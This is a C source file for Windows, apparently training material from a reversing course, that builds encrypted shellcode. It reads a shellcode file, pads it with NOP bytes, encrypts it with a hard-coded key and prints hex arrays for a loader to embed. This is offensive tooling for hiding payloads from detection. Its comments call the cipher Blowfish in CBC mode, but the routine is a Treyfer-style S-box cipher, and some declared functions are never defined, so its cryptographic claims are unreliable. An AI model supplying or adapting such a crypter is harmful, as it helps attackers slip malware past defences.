/*
    Generator
    Encryption with Blowfish (CBC)

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcgenerator.cpp
*/

#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <time.h>

/* ************************* CONFIGURATION & SEED ************************* */
#define BLOCKSIZE   64
#define BLOCKSIZEB  8
#define KEYSIZE     64
#define KEYSIZEB    8
#define ROUNDS      12
#define SHIFT       1

// ROTL and ROTR for 8-bit
#define rotl(x, n) ((x) << (n) | (x) >> (8 - (n)))
#define rotr(x, n) ((x) >> (n) | (x) << (8 - (n)))


static const uint8_t S[256] = {
	//0     1    2      3     4    5     6     7      8    9     A      B    C     D     E     F
    0xbb, 0xd6, 0x2a, 0x48, 0x8e, 0x3f, 0x89, 0x11, 0x18, 0x0b, 0x47, 0x3b, 0x12, 0x16, 0x23, 0xb7, 
    0xa5, 0xc2, 0xd1, 0xd5, 0x88, 0xc8, 0xb3, 0x92, 0x81, 0x4b, 0x7d, 0x64, 0x02, 0xed, 0xe2, 0x2f, 
    0x13, 0xfc, 0xcf, 0x46, 0x37, 0xbf, 0xb0, 0xf1, 0xa6, 0x63, 0xea, 0x97, 0x58, 0xcd, 0x03, 0xfa, 
    0xdd, 0xd3, 0xe9, 0xce, 0x71, 0x41, 0xe3, 0xad, 0x55, 0x99, 0x2b, 0xbe, 0x06, 0x2e, 0xa1, 0x4f, 
    0x56, 0x6b, 0xde, 0x8f, 0x54, 0xe7, 0x95, 0x5c, 0x82, 0x19, 0x2c, 0x8c, 0x04, 0x94, 0x7a, 0x6a, 
    0x57, 0x28, 0xa8, 0x6c, 0xf8, 0xc7, 0xaa, 0xa9, 0x9c, 0x4d, 0xb2, 0xef, 0xb4, 0x21, 0x87, 0x79, 
    0x40, 0x62, 0x10, 0xc6, 0x75, 0xf6, 0x1d, 0xf0, 0x42, 0xe4, 0x0e, 0xbc, 0x1c, 0xcc, 0xd2, 0x0a, 
    0x17, 0xaf, 0x49, 0xdb, 0xff, 0xdf, 0x36, 0xc3, 0x72, 0x3d, 0x7e, 0x9f, 0x4a, 0x7c, 0xf4, 0x8b, 
    0x84, 0x91, 0x51, 0x25, 0xf3, 0x5a, 0x86, 0x00, 0xf9, 0x09, 0x0c, 0xb6, 0x30, 0x6e, 0x6f, 0x15, 
    0xab, 0x5e, 0x07, 0xb1, 0x34, 0xf7, 0xec, 0xc1, 0x43, 0x83, 0xc9, 0x1e, 0xba, 0x93, 0xee, 0x1b, 
    0xc4, 0x20, 0x80, 0x0f, 0x2d, 0xf2, 0xe6, 0x59, 0x8a, 0x6d, 0x7b, 0x9e, 0xe5, 0x38, 0xb8, 0xcb, 
    0x29, 0xc0, 0x3c, 0x61, 0x01, 0x76, 0x85, 0x9a, 0x68, 0xfb, 0x90, 0xfe, 0x5f, 0xb5, 0x60, 0x50, 
    0x70, 0x5d, 0x27, 0xb9, 0x8d, 0x3a, 0xbd, 0xeb, 0x44, 0x9d, 0xac, 0x73, 0xd0, 0x22, 0x1a, 0xe1, 
    0xa4, 0x77, 0xe8, 0x9b, 0x45, 0x05, 0xfd, 0x33, 0x24, 0x1f, 0x5b, 0xf5, 0x39, 0xa0, 0xa3, 0x66, 
    0x08, 0x31, 0x67, 0x65, 0xda, 0xd9, 0xa2, 0xd7, 0x26, 0xca, 0x98, 0x35, 0x53, 0xd4, 0x0d, 0x4e, 
    0x69, 0x3e, 0x4c, 0xae, 0xe0, 0x32, 0x7f, 0x78, 0xa7, 0x52, 0x14, 0x96, 0xdc, 0x74, 0xc5, 0xd8,
};


/* ********************* INTERNAL FUNCTIONS PROTOTYPE ********************* */
void block_encrypt(uint8_t * data, const uint8_t * key);
void key_setup(uint8_t * data, const uint8_t * key);

void treyfer_crypt(uint8_t * data, const uint8_t * key);


/* *************************** HELPER FUNCTIONS *************************** */
/* XOR 2 block data */
void xor_block(uint8_t * dst, uint8_t * src1, uint8_t * src2)
{
    register uint32_t i = 0;
    for (i = 0; i < BLOCKSIZEB; i++)
        dst[i] = src1[i] ^ src2[i];
}

void print_hex(char* header, uint8_t * data, uint32_t length)
{
    printf("%s = {", header);
    for (int idx = 0; idx < length; idx++)
    {
        if (idx % 16 == 0)
            printf("\n  ");
    
        printf("0x%02x, ", data[idx]);
    }
    printf("\n}\n");
    printf("Length: %d\n", length);
}


// Blowfish encryption with CBC
void encrypt (uint8_t * data, uint32_t size, uint8_t * key, uint8_t * iv)
{
    uint32_t   i;
    uint8_t  * prev_block = iv;

    for (i = 0; i < size; i += BLOCKSIZEB)
    {
        // XOR block plaintext dengan block ciphertext sebelumnya
        xor_block(&data[i], &data[i], prev_block);

        // Enkripsi plaintext menjadi ciphertext
        block_encrypt(&data[i], key);

        // Simpan block ciphertext untuk operasi XOR selanjutnya
        prev_block = &data[i];
    }
}

int main()
{
    HANDLE f;
    SIZE_T payload_len, alloc_size, remainder;
    DWORD  nread;

    uint8_t * payload;

    // static key because the key is awesome
    uint8_t   key[] = 
            { 0x52, 0x45, 0x56, 0x45, 0x52, 0x53, 0x49, 0x4E, 0x47, 0x2E, 0x49, 0x44, 
    /* ASCII:   R     E     V     E     R     S     I     N     G     .     I     D  */
              0x31, 0x33, 0x33, 0x37 };
            /*  1     3     3     7  */

    // generate IV, this example is not cryptographically secure
    uint8_t   iv[BLOCKSIZEB];

    srand(time(0));
    for (int i = 0; i < BLOCKSIZEB; i++)
        iv[i] = rand() % 0xFF;

    // open existing file
    f = CreateFile ("shellcode.bin", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    // allocate enough space for payload blocks and IV
    payload_len = GetFileSize (f, NULL);
    remainder   = payload_len % BLOCKSIZEB;
    alloc_size  = payload_len + (remainder ? BLOCKSIZEB - remainder : 0);

    payload = (uint8_t*) HeapAlloc (GetProcessHeap(), HEAP_ZERO_MEMORY, alloc_size + BLOCKSIZEB);

    // read the shellcode
    memset(payload, 0x90, alloc_size);
    ReadFile(f, payload, payload_len, &nread, NULL);

    // encrypt the shellcode
    memcpy (&payload[alloc_size], iv, BLOCKSIZEB);
    encrypt (payload, alloc_size, key, iv);

    // print
    print_hex("IV", iv, BLOCKSIZEB);
    print_hex("Payload", payload, alloc_size + BLOCKSIZEB);

    // destroy heap
    HeapFree (GetProcessHeap(), 0, payload);
}

void block_encrypt(uint8_t * val, const uint8_t * key)
{
    size_t   i, j;
    uint8_t  t = val[0];

    for (j = 0; j < ROUNDS; j++)
    {
        for (i = 0; i < BLOCKSIZEB; i++)
        {
            t = t + key[i];

            // printf("t: %d | key[%d]: %d | S[%d]: %d\n", t, j, key[j], t, S[t]);
            t = S[t] + val[(i + 1) % BLOCKSIZEB];
            t = rotl(t, SHIFT);

            val[(i + 1) % BLOCKSIZEB] = t;
        }
    }
}